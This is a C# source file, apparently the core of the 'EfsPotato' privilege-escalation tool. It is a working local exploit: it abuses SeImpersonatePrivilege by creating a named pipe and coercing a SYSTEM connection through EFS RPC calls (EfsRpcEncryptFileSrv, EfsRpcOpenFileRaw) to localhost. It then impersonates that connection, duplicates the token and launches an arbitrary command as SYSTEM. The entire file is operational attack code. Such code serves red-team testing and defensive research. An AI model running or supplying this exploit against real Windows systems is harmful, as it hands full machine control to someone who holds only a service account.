using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using EfsPotato.Interop;
using RpcLibrary;

namespace EfsPotato.Library
{
    using NTSTATUS = Int32;
    using RPC_STATUS = Int32;

    internal class Modules
    {
        public static bool GetSystem(
            string command,
            string endpointPipeName,
            int sessionId,
            bool interactive)
        {
            IntPtr hPipe;
            var status = false;
            var requiredPrivs = new List<string>
            {
                Win32Consts.SE_IMPERSONATE_NAME
            };
            var validEndpoints = new List<string>
            {
                "efsrpc", "lsarpc", "lsass", "netlogon", "samr"
            };
            Globals.UserPipeName = string.Format("{{{0}}}", Guid.NewGuid().ToString().ToUpper());

            if (!validEndpoints.Contains(endpointPipeName.ToLower()))
            {
                Console.WriteLine("[-] Invalid endpoint pipe name is specifed.");
                return false;
            }
            else
            {
                Globals.EndpointPipeName = endpointPipeName.ToLower();
            }

            if ((sessionId > 0) && interactive)
            {
                Console.WriteLine("[!] Session ID and interactive mode flag must not be specified at once.");
                return false;
            }

            if (!Utilities.EnableTokenPrivileges(
                requiredPrivs,
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                return false;
            }

            do
            {
                NTSTATUS ntstatus;
                int error;
                IntPtr hDupToken;
                PROCESS_INFORMATION processInformation;
                var pipePath = string.Format(@"\\.\pipe\{0}\pipe\srvsvc", Globals.UserPipeName);
                var overwrapped = new OVERLAPPED();
                var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
                var spoolerThread = new Thread(new ThreadStart(TriggerPrintSpooler));
                var startupInfo = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)) };

                Console.WriteLine("[>] Trying to create named pipe.");

                hPipe = Utilities.CreateNewNamedPipe(pipePath);

                if (hPipe == Win32Consts.INVALID_HANDLE_VALUE)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create named pipe");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Named pipe is created successfully.");
                    Console.WriteLine("    [*] Path : {0}", pipePath);
                }

                overwrapped.hEvent = NativeMethods.CreateEvent(IntPtr.Zero, true, false, null);

                if (overwrapped.hEvent == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create service handling event objects.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }

                if (!NativeMethods.ConnectNamedPipe(hPipe, ref overwrapped))
                {
                    error = Marshal.GetLastWin32Error();

                    if (error != Win32Consts.ERROR_IO_PENDING)
                    {
                        Console.WriteLine("[-] Failed to connect named pipe");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                        NativeMethods.NtClose(overwrapped.hEvent);
                        break;
                    }
                }

                Console.WriteLine("[>] Waiting for named pipe connection.");

                spoolerThread.Start();
                ntstatus = NativeMethods.NtWaitForSingleObject(overwrapped.hEvent, false, in timeout);
                NativeMethods.NtClose(overwrapped.hEvent);

                if (ntstatus == Win32Consts.STATUS_TIMEOUT)
                {
                    Console.WriteLine("[-] Timeout.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got named pipe connection.");
                }

                if (!NativeMethods.ImpersonateNamedPipeClient(hPipe))
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to named pipe impersonation.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    var sid = Helpers.GetTokenUserSid(WindowsIdentity.GetCurrent().Token);
                    Console.WriteLine("[+] Named pipe impersonation is successful (SID: {0}).", sid);
                    NativeMethods.NtClose(hPipe);
                    hPipe = Win32Consts.INVALID_HANDLE_VALUE;
                }

                hDupToken = Helpers.DuplicateCurrentToken();

                if (interactive)
                {
                    status = NativeMethods.CreateProcessAsUser(
                        hDupToken,
                        null,
                        command,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        PROCESS_CREATION_FLAGS.CREATE_BREAKAWAY_FROM_JOB,
                        IntPtr.Zero,
                        Environment.CurrentDirectory,
                        in startupInfo,
                        out processInformation);
                }
                else
                {
                    if (sessionId > 0)
                    {
                        IntPtr pInfoBuffer = Marshal.AllocHGlobal(4);
                        Marshal.WriteInt32(pInfoBuffer, sessionId);
                        ntstatus = NativeMethods.NtSetInformationToken(
                            hDupToken,
                            TOKEN_INFORMATION_CLASS.TokenSessionId,
                            pInfoBuffer,
                            4u);
                        Marshal.FreeHGlobal(pInfoBuffer);

                        if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        {
                            Console.WriteLine("[-] Failed to adjust session ID.");
                            Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                            NativeMethods.NtClose(hDupToken);
                            break;
                        }
                    }

                    status = NativeMethods.CreateProcessWithToken(
                        hDupToken,
                        LOGON_FLAGS.LOGON_WITH_PROFILE,
                        null,
                        command,
                        PROCESS_CREATION_FLAGS.NONE,
                        IntPtr.Zero,
                        Environment.CurrentDirectory,
                        in startupInfo,
                        out processInformation);
                }

                NativeMethods.NtClose(hDupToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to spawn SYSTEM process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                }
                else
                {
                    Console.WriteLine("[+] SYSTEM process is executed successfully (PID = {0}).", processInformation.dwProcessId);

                    if (interactive)
                        NativeMethods.NtWaitForSingleObject(processInformation.hThread, true, IntPtr.Zero);

                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
            } while (false);

            if (hPipe != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hPipe);

            Console.WriteLine("[*] Done.");

            return status;
        }


        private static void TriggerPrintSpooler()
        {
            RPC_STATUS rpcStatus;
            string filePath = string.Format(@"\\localhost/pipe/{0}\C$\PrivFu.txt", Globals.UserPipeName);

            using (var rpc = new MsEfsr(Globals.EndpointPipeName))
            {
                IntPtr hBinding = rpc.GetEfsrBindingHandle(@"\\127.0.0.1");

                if (hBinding != IntPtr.Zero)
                {
                    if (Globals.RpcProcOpt == RPC_PROC_OPTIONS.EfsRpcEncryptFileSrv)
                    {
                        Console.WriteLine("[>] Calling EfsRpcEncryptFileSrv().");
                        Console.WriteLine("    [*] Target File Path   : {0}", filePath.ToString());
                        Console.WriteLine("    [*] Endpoint Pipe Name : \\pipe\\{0}", Globals.EndpointPipeName);

                        // Expected RPC_STATUS is 0x00000035 (ERROR_BAD_NETPATH)
                        rpcStatus = rpc.EfsRpcEncryptFileSrv(hBinding, filePath);
                    }
                    else
                    {
                        Console.WriteLine("[>] Calling EfsRpcOpenFileRaw().");
                        Console.WriteLine("    [*] Target File Path   : {0}", filePath.ToString());
                        Console.WriteLine("    [*] Endpoint Pipe Name : \\pipe\\{0}", Globals.EndpointPipeName);

                        // Expected RPC_STATUS is 0x00000035 (ERROR_BAD_NETPATH)
                        rpcStatus = rpc.EfsRpcOpenFileRaw(hBinding, out IntPtr hContext, filePath, 0);

                        if (hContext != IntPtr.Zero)
                            rpc.EfsRpcCloseRaw(ref hContext);
                    }

                    RpcHelpers.CloseBindingHandle(ref hBinding);
                }
                else
                {
                    Console.WriteLine("[-] Failed to get binding handle for rpc call.");
                }
            }
        }
    }
}
